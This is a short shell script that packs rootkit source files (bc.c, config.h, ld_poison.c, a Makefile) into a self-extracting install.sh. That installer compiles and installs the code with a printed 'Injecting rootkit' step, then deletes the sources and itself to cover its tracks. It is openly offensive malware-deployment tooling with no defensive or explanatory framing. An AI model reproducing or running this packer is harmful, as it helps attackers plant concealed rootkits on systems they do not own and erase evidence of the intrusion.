#!/bin/sh

INSTALL_FILE=install.sh
FILES="bc.c config.h ld_poison.c Makefile"

echo "[-] Creating Installation File $INSTALL_FILE"
echo "#!/bin/sh" > $INSTALL_FILE

for FILE in $FILES
do
	echo "[-] Packing $FILE"
	echo "echo '[-] Extracting $FILE'" >> $INSTALL_FILE
	echo "cat > ./$FILE << EOF" >> $INSTALL_FILE
	cat $FILE >> $INSTALL_FILE
	echo "EOF" >> $INSTALL_FILE
done

echo "[-] Packing Install Sequence"
echo "echo '[-] Compiling source code'" >> $INSTALL_FILE
echo "make all" >> $INSTALL_FILE
echo "echo '[-] Injecting rootkit'" >> $INSTALL_FILE
echo "make install" >> $INSTALL_FILE

echo "[-] Packing Cleanup Sequence"
for FILE in $FILES
do
	echo "rm $FILE" >> $INSTALL_FILE	
done

echo "rm $INSTALL_FILE" >> $INSTALL_FILE

chmod +x $INSTALL_FILE

echo "[-] Your Packer is ready: $INSTALL_FILE"
